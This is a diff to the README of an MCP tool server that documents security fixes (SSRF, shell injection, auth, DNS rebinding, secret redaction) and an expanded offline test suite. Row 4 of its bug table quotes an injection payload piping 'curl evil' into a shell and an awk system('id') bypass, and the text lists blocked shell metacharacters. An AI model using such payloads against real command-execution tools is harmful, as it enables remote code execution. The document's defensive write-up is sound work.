@@ -1,9 +1,9 @@
-# mts.py — MCP Tool Server v4.0
+# mts.py — MCP Tool Server v4.1.0
 
-A single-file, dependency-free (stdlib-only) MCP tool server that speaks both **JSON-RPC 2.0
-(MCP `2024-11-05`)** and a **plain REST** dialect over HTTP. v4.0 is a hardening + capability
-release: every bug from the v3.8 review is fixed, the web-search stack was rebuilt, and the
-registry grew from 54 to **93 tools**.
+A single-file MCP tool server with a standard-library core (PyYAML and psutil are optional) that
+speaks both **JSON-RPC 2.0 (MCP `2024-11-05`)** and a **plain REST** dialect over HTTP. v4.1.0
+extends the v4.0 hardening and search capabilities with bounded inputs, outputs, caches, archive
+parsing, and subprocess capture; the registry remains at **93 tools**.
 
 ```bash
 python3 mts.py                      # start the server
@@ -11,7 +11,7 @@ python3 mts.py --port 9000          # start on another port
 python3 mts.py --list-tools         # dump the registry
 python3 mts.py --self-test          # internal diagnostics, exit 0/1
 python3 mts.py --call web_search '{"query":"rust async runtime","max_results":5}'
-python3 tests/test_mts.py           # 59 offline tests (no network required)
+python3 -m unittest tests.test_mts -v  # 86 offline tests (no external network required)
 ```
 
 ---
@@ -24,7 +24,7 @@ python3 tests/test_mts.py           # 59 offline tests (no network required)
 | 2 | Critical | `_read_limited_response` could never detect truncation (`total > limit` was unreachable because reads were capped at `limit - total`) → `web_download_file` wrote **silently corrupted** files >2 MB and reported `"success"`. | `_read_stream_limited()` returns `(data, truncated)` by probing one extra byte; `web_download_file` streams to `*.part`, checks `Content-Length`, aborts loudly, and returns a SHA-256. |
 | 3 | Critical | `_cfg_val` did `cast_type(value)` for config-file values, so `"require_auth": "false"` became **`True`**. | `_to_bool()` is used for both config-file and env values. |
 | 4 | Critical | `execute_bash_command` ran `shell=True` and only inspected `tokens[0]` — `"echo hi\ncurl evil \| sh"` executed both lines; `awk 'BEGIN{system("id")}'` contained no blocked substring; `rm`/`chmod` were whitelisted; `>` was unblocked. | **No shell at all.** `shlex.split`, metacharacter rejection (`; & \| \` $ > < newline ( ) { } \\ !`), allow-list on the resolved binary, per-argument sandbox checks, `rm/chmod/dd/...` only with `allow_destructive_bash`, rlimits applied. |
-| 5 | Critical | SSRF: the guard ran only *before* the request; `urlopen` then followed redirects with no per-hop check (`http_request`, `fetch_json_api`, `web_download_file`, `parse_url_headers`). `_host_is_private` **failed open** when DNS raised `OSError`. | `_SafeRedirectHandler` validates **every hop** and strips `Authorization`/`Cookie` across hosts; `_host_is_private` **fails closed**; IPv4-mapped IPv6, 6to4, unspecified and a metadata-host denylist are covered. |
+| 5 | Critical | SSRF: the guard ran only *before* the request; `urlopen` then followed redirects with no per-hop check (`http_request`, `fetch_json_api`, `web_download_file`, `parse_url_headers`). `_host_is_private` **failed open** when DNS raised `OSError`. | `_SafeRedirectHandler` validates **every hop** and strips `Authorization`/`Cookie` across hosts; `_host_is_private` **fails closed**; IPv4-mapped IPv6, 6to4, Teredo, unspecified and metadata hosts are covered, and the connection uses the validated DNS address. |
 | 6 | High | `get_environment_variable(name=...)` bypassed the secret filter → `MCP_API_TOKEN` was readable. | Named lookups are redacted too; revealing requires `MCP_ENABLE_DANGEROUS=true` **and** `reveal_secrets=true`. |
 | 7 | High | Auth: `==` token comparison, empty token authenticated `"Bearer "`, `?token=` was accepted *and logged*, `GET /tools` was unauthenticated. | `hmac.compare_digest`, empty token ⇒ deny + error log, `?token=` opt-in only (`allow_token_in_query`), all endpoints except `/health` require auth, logs are redacted. |
 | 8 | High | `set_environment_variable` could set `PATH`/`LD_PRELOAD` ⇒ code execution. | Protected-name denylist + `MCP_*` lockout + identifier validation. |
@@ -40,7 +40,10 @@ python3 tests/test_mts.py           # 59 offline tests (no network required)
 | 18 | Medium | `_save_memory` was a non-atomic truncating write (crash = lost store). | Temp file + `os.replace`, size cap, corrupt-file recovery. |
 | 19 | Low | Dead code: `_fetch_url`'s `for _ in range(6)` and `read_url_hardened`'s hop loop never iterated; `_retry_on_exception` never fired (URLError was re-raised as `RuntimeError` inside); `_cache_get/_cache_set` had zero callers. | Redirect handling moved into the opener; retries work (and skip `HTTPError`); the TTL cache now backs search + fetch and is bounded, with `cache_stats`/`cache_clear`. |
 | 20 | Low | `file_tree` never drew `└──`, had an unclamped depth and unbounded output; `_extract_html_details` never called `parser.close()`; `_build_mcp_input_schema` rejected negative defaults; the handler passed raw client kwargs to `func(**args)` (unknown key ⇒ 500, `"true"` for bools). | All fixed; arguments are now validated and coerced against `TOOL_SCHEMAS` with "did you mean" suggestions. |
-| 21 | Bonus | `temporary_file()` opened the temp file **from the fd**, so `tf.name` was an `int` — every `subprocess` caller using `tf.name` was broken. | Opens by path. |
+| 21 | Bonus | `temporary_file()` exposed an integer fd as `tf.name`, breaking subprocess callers that need a filesystem path. | Uses `NamedTemporaryFile` to retain exclusive creation while exposing a string path. |
+| 22 | High | DNS validation followed by a regular URL open left a rebinding window; archive listing, table parsing, and converter inputs could grow without practical bounds. | Pin vetted IP addresses at the socket layer; cap tool request sizes, XML/YAML expansion, HTML tables, archive entries, subprocess output and caches. |
+| 23 | High | Image/search parsers passed through untrusted result URLs, and generated Markdown could emit active schemes. | Normalize and validate extracted result URLs as HTTP(S); sanitize image and thumbnail URLs and restrict Markdown links. |
+| 24 | Medium | Process environment and memory tool inputs could be oversized or allow dangerous configuration mutation. | Protect execution/network-related environment names; cap environment names/values, memory keys/values/tags, and return redacted secrets by default. |
 
 ---
 
@@ -174,10 +177,9 @@ See `mts_config.example.json`.
 * **Filesystem** — every path goes through `_safe_path` (realpath + `commonpath` against the
   sandbox root, null-byte and traversal rejection); relative paths resolve *inside* the sandbox.
 * **Network** — scheme/credential validation, DNS-resolved IP classification (private, loopback,
-  link-local, reserved, multicast, unspecified, IPv4-mapped/6to4), metadata-host denylist,
-  per-redirect re-validation, credential stripping across hosts, byte caps on every read.
-  *Residual risk:* DNS re-binding between the check and the connection is not fully eliminated
-  (that needs IP pinning at the socket layer) — keep `allow_private_networks=false`.
+  link-local, reserved, multicast, unspecified, IPv4-mapped/6to4/Teredo), metadata-host denylist,
+  per-redirect re-validation, DNS-pinned socket connections, credential stripping across hosts,
+  and byte caps on every read. `allow_private_networks=false` remains the recommended setting.
 * **Execution** — disabled by default. `safe_execute_python` uses allow-lists + `rlimit`s;
   `execute_bash_command` never invokes a shell.
 * **Secrets** — env values matching `token|key|secret|auth|pwd|password|credential|session|cookie|private`
@@ -192,16 +194,23 @@ See `mts_config.example.json`.
 
 ## 7. Tests
 
-`tests/test_mts.py` — 59 tests, no network required (~1 s):
+`tests/test_mts.py` — 86 offline tests, no external network required:
 
 * search scrapers against recorded Bing/DDG/DDG-lite/Mojeek fixtures, redirector unwrapping,
   engine-failure isolation, rank fusion + URL canonicalisation, summariser relevance;
-* truncation detection, SSRF host classification, fail-closed DNS, URL validation;
-* sandbox traversal, zip-slip, `apply_patch` safety, file/tree/checksum behaviour;
-* sandbox-escape attempts against `safe_execute_python`, bash injection payloads;
-* data/text/memory/HTML/RSS tools; registry & schema consistency; argument coercion;
-* a **live loopback HTTP fixture** for redirects (including a blocked metadata redirect),
-  download limits, 5xx handling, Markdown conversion, parallel fetching and the end-to-end
-  `web_search` pipeline with caching;
+* truncation detection, SSRF host classification, fail-closed DNS, DNS-rebinding protection,
+  URL validation, and safe XML/Markdown parsing;
+* sandbox traversal, zip-slip, archive limits/list truncation, `apply_patch` rollback,
+  file/tree/checksum behaviour;
+* sandbox-escape attempts against `safe_execute_python`, bash injection payloads, bounded
+  subprocess output and timeout handling;
+* data/text/memory/HTML/RSS tools; registry & schema consistency; request-size validation;
+* a **loopback HTTP fixture** for redirects (including a blocked metadata redirect), download
+  limits, 5xx handling, Markdown conversion, parallel fetching and the end-to-end `web_search`
+  pipeline with caching;
 * the real `Handler` over a loopback socket: auth, JSON-RPC `initialize`/`tools/list`/`tools/call`,
   REST path calls, 404/413 handling.
+
+`tests/test_mts_tool_coverage.py` additionally invokes all **93 registered tools** against
+in-memory or local fixtures (including search, DNS, WHOIS, and file tools) with no external
+services or credentials.
